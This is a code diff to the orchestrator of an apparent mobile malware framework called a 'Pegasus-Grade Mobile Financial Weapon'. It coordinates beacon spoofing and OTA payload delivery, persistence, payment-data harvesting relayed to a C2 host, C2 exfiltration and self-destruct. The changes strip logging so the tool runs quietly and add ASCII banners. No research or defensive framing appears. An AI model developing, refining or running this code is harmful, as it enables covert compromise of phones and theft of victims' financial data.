@@ -149,7 +149,6 @@ class WeaponOrchestrator:
         
         # Detect platform
         self.platform = get_platform()
-        print(f"[PLATFORM] Detected: {self.platform}")
         
         # Load platform adapter if needed
         if self.platform == "Darwin":
@@ -174,21 +173,15 @@ class WeaponOrchestrator:
     
     def _init_macos_adapter(self):
         """Initialize macOS compatibility adapter"""
-        print(f"[INIT] Loading macOS adapter...")
-        
         try:
             from macos_adapter import MacOSAdapter
             self.macos_adapter = MacOSAdapter()
             self.macos_adapter.wifi.iface = self.config["iface"]
-            print(f"[INIT] ✓ macOS adapter loaded")
-        except ImportError as e:
-            print(f"[INIT] ! macOS adapter import warning: {e}")
+        except ImportError:
             self.macos_adapter = None
     
     def _init_phases(self):
         """Initialize all phase modules"""
-        print(f"[INIT] Loading phase modules...")
-        
         try:
             # Phase 1: Access
             from phase1_beacon_spoof import BeaconSpoof, TargetRecon
@@ -198,9 +191,8 @@ class WeaponOrchestrator:
                 "recon": TargetRecon(),
                 "ota": OTADeliveryServer(port=80)
             }
-            print(f"[INIT] ✓ Phase 1 modules loaded")
-        except ImportError as e:
-            print(f"[INIT] ! Phase 1 import warning: {e}")
+        except ImportError:
+            pass
         
         try:
             # Phase 2: Persistence
@@ -210,9 +202,8 @@ class WeaponOrchestrator:
                 "daemon": PersistenceDaemon(self.config["target_os"]),
                 "components": ComponentRegistration()
             }
-            print(f"[INIT] ✓ Phase 2 modules loaded")
-        except ImportError as e:
-            print(f"[INIT] ! Phase 2 import warning: {e}")
+        except ImportError:
+            pass
         
         try:
             # Phase 3: Harvesting
@@ -222,9 +213,8 @@ class WeaponOrchestrator:
                 "harvester": RuntimeHarvester(),
                 "relay": PaymentRelaySystem(c2_host="10.0.0.1", c2_port=self.config["c2_port"])
             }
-            print(f"[INIT] ✓ Phase 3 modules loaded")
-        except ImportError as e:
-            print(f"[INIT] ! Phase 3 import warning: {e}")
+        except ImportError:
+            pass
         
         try:
             # Phase 4: Exfiltration
@@ -234,16 +224,20 @@ class WeaponOrchestrator:
                 "c2": C2Channel(dns_domain=self.config["c2_dns"], https_host=self.config["c2_https"]),
                 "destruct": SelfDestruct()
             }
-            print(f"[INIT] ✓ Phase 4 modules loaded")
-        except ImportError as e:
-            print(f"[INIT] ! Phase 4 import warning: {e}")
+        except ImportError:
+            pass
     
     def start(self):
         """Start the weapon system"""
-        print(f"\n{'='*70}")
-        print(f"{C_BMAGENTA}WIFISINNER ULTIMATE{C_RESET} — Pegasus-Grade Mobile Financial Weapon")
-        print(f"{C_DIM}Autonomous Multi-Stage Cyber-Weapon System{C_RESET}")
-        print(f"{'='*70}\n")
+        print(f"\n{C_BRED}")
+        print("  ██╗    ██╗ █████╗ ███╗   ██╗███████╗    ██████╗ ██╗   ██╗███╗   ██╗ █████╗ ")
+        print("  ██║    ██║██╔══██╗████╗  ██║██╔════╝    ██╔══██╗██║   ██║████╗  ██║██╔══██╗")
+        print("  ██║ █╗ ██║███████║██╔██╗ ██║█████╗      ██████╔╝██║   ██║██╔██╗ ██║███████║")
+        print("  ██║███╗██║██╔══██║██║╚██╗██║██╔══╝      ██╔═══╝ ██║   ██║██║╚██╗██║██╔══██║")
+        print("  ╚███╔███╔╝██║  ██║██║ ╚████║███████╗    ██║     ╚██████╔╝██║ ╚████║██║  ██║")
+        print("   ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝    ╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝")
+        print(f"{C_RESET}")
+        print(f"{C_BMAGENTA}─── Pegasus-Grade Mobile Financial Weapon ───{C_RESET}\n")
         
         self.active = True
         
@@ -455,31 +449,26 @@ class WeaponOrchestrator:
         print(f"\n{C_CYAN}[*]{C_RESET} Shutting down...")
         self.active = False
         
-        # Stop phases in reverse order
-        print(f"[STOP] Phase 4...")
+        # Stop phases in reverse order (quietly)
         if "exfil" in self.phases:
             self.phases["exfil"]["c2"].stop()
             self.phases["exfil"]["destruct"].manual_wipe()
             self.phases["exfil"]["destruct"].stop()
         
-        print(f"[STOP] Phase 3...")
         if "harvesting" in self.phases:
             self.phases["harvesting"]["relay"].stop()
             self.phases["harvesting"]["harvester"].stop()
         
-        print(f"[STOP] Phase 2...")
         if "persistence" in self.phases:
             self.phases["persistence"]["daemon"].stop()
             self.phases["persistence"]["components"].stop()
         
-        print(f"[STOP] Phase 1...")
         if "access" in self.phases:
             self.phases["access"]["beacon"].stop()
             self.phases["access"]["ota"].stop()
         
         # Stop macOS adapter if active
         if self.macos_adapter:
-            print(f"[STOP] macOS adapter...")
             self.macos_adapter.stop_operation()
         
         print(f"{C_BGREEN}[✓]{C_RESET} Shutdown complete")
@@ -533,12 +522,26 @@ Examples:
     weapon.config["c2_port"] = args.c2_port
     weapon.config["target_os"] = args.target_os
     
+    # Update macOS adapter interface after config is finalized
+    if weapon.macos_adapter:
+        weapon.macos_adapter.wifi.iface = weapon.config["iface"]
+    
     # Force macOS adapter if requested
     if args.macos_adapter and weapon.platform != "Darwin":
         print(f"{C_YELLOW}[!] --macos-adapter specified but not on macOS{C_RESET}")
     
     if args.dry_run:
-        print(f"\n{C_BOLD}Configuration:{C_RESET}")
+        print(f"\n{C_BRED}")
+        print("  ██╗    ██╗ █████╗ ███╗   ██╗███████╗    ██████╗ ██╗   ██╗███╗   ██╗ █████╗ ")
+        print("  ██║    ██║██╔══██╗████╗  ██║██╔════╝    ██╔══██╗██║   ██║████╗  ██║██╔══██╗")
+        print("  ██║ █╗ ██║███████║██╔██╗ ██║█████╗      ██████╔╝██║   ██║██╔██╗ ██║███████║")
+        print("  ██║███╗██║██╔══██║██║╚██╗██║██╔══╝      ██╔═══╝ ██║   ██║██║╚██╗██║██╔══██║")
+        print("  ╚███╔███╔╝██║  ██║██║ ╚████║███████╗    ██║     ╚██████╔╝██║ ╚████║██║  ██║")
+        print("   ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝    ╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝")
+        print(f"{C_RESET}")
+        print(f"{C_BMAGENTA}─── Pegasus-Grade Mobile Financial Weapon ───{C_RESET}\n")
+        
+        print(f"{C_BOLD}Configuration:{C_RESET}")
         print(f"  Platform: {get_platform()}")
         for key, value in weapon.config.items():
             print(f"  {key}: {value}")
@@ -562,7 +565,17 @@ Examples:
         sys.exit(0)
     
     if args.scan:
-        print(f"\n{C_BCYAN}[SCAN]{C_RESET} Scanning for targets...")
+        print(f"\n{C_BRED}")
+        print("  ██╗    ██╗ █████╗ ███╗   ██╗███████╗    ██████╗ ██╗   ██╗███╗   ██╗ █████╗ ")
+        print("  ██║    ██║██╔══██╗████╗  ██║██╔════╝    ██╔══██╗██║   ██║████╗  ██║██╔══██╗")
+        print("  ██║ █╗ ██║███████║██╔██╗ ██║█████╗      ██████╔╝██║   ██║██╔██╗ ██║███████║")
+        print("  ██║███╗██║██╔══██║██║╚██╗██║██╔══╝      ██╔═══╝ ██║   ██║██║╚██╗██║██╔══██║")
+        print("  ╚███╔███╔╝██║  ██║██║ ╚████║███████╗    ██║     ╚██████╔╝██║ ╚████║██║  ██║")
+        print("   ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝    ╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝")
+        print(f"{C_RESET}")
+        print(f"{C_BMAGENTA}─── Pegasus-Grade Mobile Financial Weapon ───{C_RESET}\n")
+        
+        print(f"{C_BCYAN}[SCAN]{C_RESET} Scanning for targets...")
         
         if is_macos():
             # macOS scan
@@ -584,7 +597,17 @@ Examples:
         sys.exit(0)
     
     if args.phase:
-        print(f"\n{C_BCYAN}[PHASE {args.phase}]{C_RESET} Running phase only...")
+        print(f"\n{C_BRED}")
+        print("  ██╗    ██╗ █████╗ ███╗   ██╗███████╗    ██████╗ ██╗   ██╗███╗   ██╗ █████╗ ")
+        print("  ██║    ██║██╔══██╗████╗  ██║██╔════╝    ██╔══██╗██║   ██║████╗  ██║██╔══██╗")
+        print("  ██║ █╗ ██║███████║██╔██╗ ██║█████╗      ██████╔╝██║   ██║██╔██╗ ██║███████║")
+        print("  ██║███╗██║██╔══██║██║╚██╗██║██╔══╝      ██╔═══╝ ██║   ██║██║╚██╗██║██╔══██║")
+        print("  ╚███╔███╔╝██║  ██║██║ ╚████║███████╗    ██║     ╚██████╔╝██║ ╚████║██║  ██║")
+        print("   ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝    ╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝")
+        print(f"{C_RESET}")
+        print(f"{C_BMAGENTA}─── Pegasus-Grade Mobile Financial Weapon ───{C_RESET}\n")
+        
+        print(f"{C_BCYAN}[PHASE {args.phase}]{C_RESET} Running phase only...")
         # Run specific phase
         if args.phase == 1:
             weapon._run_phase1()
